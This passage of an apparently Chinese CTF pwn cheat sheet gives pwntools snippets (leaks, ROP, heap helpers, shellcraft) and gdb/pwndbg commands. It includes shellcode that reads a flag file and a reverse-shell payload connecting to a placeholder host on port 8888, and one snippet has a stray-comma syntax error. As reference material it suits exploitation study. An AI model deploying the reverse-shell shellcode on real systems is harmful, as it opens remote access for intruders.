</span></span><span class=line><span class=cl><span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x7f</span><span class=s2>&#34;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># printf %s, %p 不需小端序转换</span>
</span></span><span class=line><span class=cl><span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>leak_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x7f</span><span class=s1>&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>leak_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libcBase -&gt; </span><span class=si>{:#x}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>libcBase</span><span class=p>))</span> <span class=c1># x表示转化为16进制 打印</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 快捷填充垃圾数据</span>
</span></span><span class=line><span class=cl><span class=n>cyclic</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># p64(8)： 0x0000000000000008</span>
</span></span><span class=line><span class=cl><span class=c1># `\x00` 为一字节</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bin_sh</span> <span class=o>=</span> <span class=n>libc_base_addr</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>,</span> <span class=p>,</span> <span class=n>executable</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=n>libc_base_addr</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;pop rdi;ret;&#39;</span><span class=p>))</span><span class=o>.</span><span class=fm>__next__</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span></span></span></code></pre></div></div><p><strong>shellcode 模块</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>()))</span> 		<span class=c1># shellcode汇编代码直接转化为机器码 32位机器shellcode</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>amd64</span><span class=o>.</span><span class=n>sh</span><span class=p>()))</span> 	<span class=c1># 64位机器的shellcode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>pwnlib</span><span class=o>.</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>amd64</span><span class=o>.</span><span class=n>linux</span><span class=o>.</span><span class=n>cat2</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>))</span><span class=c1>#读取/flag，输出到标准输出</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>pwnlib</span><span class=o>.</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>amd64</span><span class=o>.</span><span class=n>linux</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=s2>&#34;ipv4&#34;</span><span class=p>,</span> <span class=s2>&#34;tcp&#34;</span><span class=p>)</span> <span class=o>+</span>\
</span></span><span class=line><span class=cl>                <span class=n>pwnlib</span><span class=o>.</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>amd64</span><span class=o>.</span><span class=n>linux</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span><span class=s2>&#34;x.x.x.x&#34;</span><span class=p>,</span> <span class=mi>8888</span><span class=p>,</span> <span class=s1>&#39;ipv4&#39;</span><span class=p>)</span><span class=o>+</span>\
</span></span><span class=line><span class=cl>                <span class=n>pwnlib</span><span class=o>.</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>amd64</span><span class=o>.</span><span class=n>linux</span><span class=o>.</span><span class=n>dupsh</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=c1>#反弹shell</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>())</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>100</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=p>)</span> <span class=c1>#ljust在shellcode基础上左对齐，后面补充A直到100个</span></span></span></code></pre></div></div><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 32位</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;./flag&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=s1>&#39;eax&#39;</span><span class=p>,</span><span class=s1>&#39;esp&#39;</span><span class=p>,</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=s1>&#39;esp&#39;</span><span class=p>,</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 64位</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;./flag&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span><span class=s1>&#39;rsp&#39;</span><span class=p>,</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=s1>&#39;rsp&#39;</span><span class=p>,</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span></span></span></code></pre></div></div><p><strong>elf+libc</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># 返回整型</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./xxx&#34;</span><span class=p>)</span>					<span class=c1># 获取ELF文件的信息</span>
</span></span><span class=line><span class=cl><span class=nb>hex</span><span class=p>(</span><span class=nb>next</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>)))</span>	<span class=c1># 获取/bin/sh的地址</span>
</span></span><span class=line><span class=cl><span class=nb>hex</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>address</span><span class=p>)</span>					<span class=c1># 获取文件基地址</span>
</span></span><span class=line><span class=cl><span class=nb>hex</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;函数/变量/符号名&#39;</span><span class=p>])</span>  <span class=c1># 获取函数/变量/符号地址</span>
</span></span><span class=line><span class=cl><span class=nb>hex</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;函数名&#39;</span><span class=p>])</span>				  <span class=c1># 获取函数在got表表项的地址</span>
</span></span><span class=line><span class=cl><span class=nb>hex</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;函数名&#39;</span><span class=p>])</span>				  <span class=c1># 获取函数PLT地址</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;libc.so.6&#34;</span><span class=p>)</span> <span class=c1># 获取libc文件信息, 若函数在libc中而不在文件的plt中, 使用此找函数偏移</span>
</span></span><span class=line><span class=cl><span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;函数名&#39;</span><span class=p>])</span> <span class=c1># 已泄露出libc基址后获取对应函数</span>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span></span></span></code></pre></div></div><p><strong>ROP</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>elf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi_ret</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;pop rdi&#39;</span><span class=p>,</span> <span class=s1>&#39;ret&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span></span></span></code></pre></div></div><p><strong>heap</strong>统一函数操作：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;choice: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;size?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;choice: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;idx?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span> <span class=c1># 有时为 str(idx).encode()</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;content:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;choice: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;idx?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;choice: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;idx?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span></span></span></code></pre></div></div><h3 id=gdb>gdb</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 更新 https://ftp.gnu.org/gnu/gdb/下载源码，升级gdb</span>
</span></span><span class=line><span class=cl>tar -zxvf gdb-xx.x.tar.gz
</span></span><span class=line><span class=cl><span class=nb>cd</span> gdb-xx.x
</span></span><span class=line><span class=cl>mkdir build
</span></span><span class=line><span class=cl><span class=nb>cd</span> build
</span></span><span class=line><span class=cl>../configure --with-python<span class=o>=</span>/usr/bin/python3.8 --enable-targets<span class=o>=</span>all
</span></span><span class=line><span class=cl>make <span class=o>&amp;&amp;</span> make install <span class=c1># apt install texinfo; sudo unlink /usr/local/share/man/man1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 替换老版本</span>
</span></span><span class=line><span class=cl>mv /usr/local/bin/gdb /usr/local/bin/gdb_bak
</span></span><span class=line><span class=cl>cp ~/gdb-xx.x/gdb/gdb /usr/local/bin/
</span></span><span class=line><span class=cl>gdb -v</span></span></code></pre></div></div><h3 id=pwndbg>pwndbg</h3><ul><li><p>切换 gdb 插件 gef、peda、pwndbg：<code>vim ~/.gdbinit</code></p></li><li><p>gdb 中的栈地址很大概率不可靠，且默认关闭了 ASLR</p></li></ul><div class="code-block code-line-numbers" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1>#下断点</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=n>malloc</span> <span class=c1># exp调试时下断点在malloc函数</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>*</span><span class=mh>0x8048000</span> <span class=c1># 汇编地址</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=n>main</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=mi>9</span> <span class=c1># c语言行号</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=n>xx</span> <span class=k>if</span> <span class=n>i</span><span class=o>=</span><span class=mi>100</span> <span class=c1># 条件断点</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>*</span><span class=err>$</span><span class=n>rebase</span><span class=p>(</span><span class=mi>0</span><span class=n>x偏移地址</span><span class=p>)</span>    <span class=c1># 应对PIE</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>info</span> <span class=n>b</span> <span class=c1>#查看断点</span>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=n>num</span>  <span class=c1>#删除断点</span>
</span></span><span class=line><span class=cl><span class=n>disable</span> <span class=n>num</span> <span class=c1># 使断点不能</span>
</span></span><span class=line><span class=cl><span class=c1># 断在函数下，先调试找到 call malloc@plt 的地址，再下断点</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 内存硬件断点 watch写断点 awatch读写断点 rwatch读断点</span>
</span></span><span class=line><span class=cl><span class=n>watch</span> <span class=o>*</span><span class=p>(</span><span class=n>unsigned</span> <span class=n>long</span> <span class=n>long</span> <span class=o>*</span><span class=p>)</span><span class=mh>0xabc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>set</span> <span class=n>args</span> <span class=mi>1</span> <span class=mi>2</span> <span class=mi>3</span> <span class=mi>4</span> <span class=c1># 设置参数，输入</span>
</span></span><span class=line><span class=cl><span class=nb>set</span> <span class=o>*</span><span class=p>(</span><span class=n>unsigned</span> <span class=n>long</span> <span class=n>long</span><span class=o>*</span> <span class=p>)</span><span class=n>address</span> <span class=o>=</span> <span class=n>xx</span>
</span></span><span class=line><span class=cl><span class=nb>set</span> <span class=err>$</span><span class=n>rax</span> <span class=o>=</span> <span class=n>xx</span>
</span></span><span class=line><span class=cl><span class=nb>set</span> <span class=n>arg</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>start</span> <span class=c1>#进入入口</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=c1>#运行</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>finish</span> <span class=c1># 跳出，执行到函数返回处</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 查看栈帧信息</span>
</span></span><span class=line><span class=cl><span class=n>info</span> <span class=n>frame</span> <span class=mi>0</span> <span class=c1># 0 为索引</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#步进stepin 进入函数</span>
</span></span><span class=line><span class=cl><span class=n>s</span>  <span class=c1>#C语言级</span>
</span></span><span class=line><span class=cl><span class=n>si</span> <span class=c1>#汇编语言级</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#步过next   跳过函数</span>
</span></span><span class=line><span class=cl><span class=n>n</span>  <span class=c1>#C语言级</span>
</span></span><span class=line><span class=cl><span class=n>ni</span> <span class=c1>#汇编语言级</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=c1>#继续 从断点到另一个断点</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>u</span> <span class=mh>0xabc</span> <span class=c1># 显示汇编码</span>
</span></span><span class=line><span class=cl><span class=n>u</span> <span class=o>&amp;</span><span class=n>func</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>backtrace</span> <span class=c1># bt显示函数调用关系</span>
</span></span><span class=line><span class=cl><span class=n>k</span> <span class=c1># 查看函数</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=c1># 从函数出来</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># core文件在程序段错误时会产生，通过ulimit命令开启</span>
</span></span><span class=line><span class=cl><span class=n>gdb</span> <span class=n>elf_file</span> <span class=n>core</span> <span class=c1># 调试到dump的位置</span>
</span></span><span class=line><span class=cl><span class=n>gdb</span> <span class=n>elf_file</span> <span class=n>PID</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#寻找 &lt;正则&gt;</span>
</span></span><span class=line><span class=cl><span class=n>search</span> <span class=n>xxx</span>
</span></span><span class=line><span class=cl><span class=n>search</span> <span class=o>-</span><span class=n>p</span> <span class=mh>0xabcdef</span> <span class=c1># 寻找数据</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>x</span><span class=o>/</span><span class=mi>10</span><span class=n>gx</span> <span class=err>$</span><span class=n>rsp</span><span class=o>+</span><span class=mh>0x10</span>  <span class=c1># 查看寄存器内容</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#打印</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=n>符号</span> 					<span class=c1># 打印符号的值, 如: ptr指针指向的值</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=n>变量</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>array_var</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=n>system</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>&amp;</span><span class=n>printf</span> 		 		 <span class=c1># printf函数的地址</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>/</span><span class=n>x</span> <span class=o>*</span><span class=p>(</span><span class=n>long</span> <span class=o>*</span><span class=p>)(</span><span class=err>$</span><span class=n>rbp</span><span class=o>-</span><span class=mh>0x40</span><span class=p>)</span> <span class=c1># 查看rbp-0x40地址处的值，十六进制形式</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>/</span><span class=n>d</span> <span class=err>$</span><span class=n>rsp</span> 				 <span class=c1># 查看rsp寄存器中的值，十进制形式</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=err>$</span><span class=n>rsp</span><span class=o>+</span><span class=mh>0x50</span> 			 <span class=c1># 查看rsp+0x50的地址 假设回显$1</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=err>$</span><span class=n>rsp</span> <span class=o>-</span> <span class=err>$</span><span class=mi>1</span> 			 <span class=c1># 可以此查看rsp与$1地址的距离</span>
</span></span><span class=line><span class=cl><span class=n>x</span><span class=o>/</span><span class=mi>20</span><span class=n>gz</span> <span class=o>&amp;</span><span class=n>_IO_2_1_stdout_</span>  <span class=c1># 查看IO_FILE结构</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=n>_IO_2_1_stdout_</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=n>x</span> <span class=o>=</span> <span class=mi>1</span> 				 <span class=c1># 改值</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=n>main_arena</span> 			 <span class=c1># 查看main_arena</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>&amp;</span><span class=n>main_arena</span><span class=o>.</span><span class=n>mutex</span>		 <span class=c1># 地址</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=o>&amp;</span><span class=n>__libc_argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> 	 <span class=c1># 找到变量地址</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>*</span><span class=n>io</span><span class=o>@</span><span class=mi>2</span>					 <span class=c1># 打印结构体数组io指向的 2个数据结构</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dc</span> <span class=n>address</span> <span class=n>num</span><span class=c1># hexdump查看某地址内容</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#格式化字符串中，自动计算格式化参数与address的偏移</span>
</span></span><span class=line><span class=cl><span class=n>fmtarg</span> <span class=n>address</span> <span class=c1># The index of format argument : 10 (&#34;\%9$p&#34;)</span>
</span></span><span class=line><span class=cl><span class=c1># 求偏移</span>
</span></span><span class=line><span class=cl><span class=n>distance</span> <span class=n>address1</span> <span class=n>address2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#查看栈 数量</span>
</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=n>xxx</span> <span class=c1># esp 和 ebp 之间的是当前执行的函数的栈帧，ebp 指向的是前一个函数的 ebp 的值</span>
</span></span><span class=line><span class=cl><span class=mh>0xffff</span> <span class=err>→</span> <span class=mh>0xfffc</span> <span class=err>←</span> <span class=s1>&#39;aaa&#39;</span> <span class=c1># 表示0xffff地址处存放着一个指针，指针指向&#39;aaa&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>telescope</span> <span class=n>address</span> <span class=c1># 类似看栈的方式查看内存</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>vmmap</span> <span class=c1>#获取调试进程中节的虚拟映射地址范围, 可见到内存中的动态链接库区域</span>
</span></span><span class=line><span class=cl><span class=n>vmmap</span> <span class=mh>0xabc</span> <span class=c1># 查看其在虚拟映射地址中位置</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=c1># libc基址</span>
</span></span><span class=line><span class=cl><span class=n>got</span>  <span class=c1># 查看got表</span>
</span></span><span class=line><span class=cl><span class=n>plt</span>  <span class=c1># 查看plt表</span>
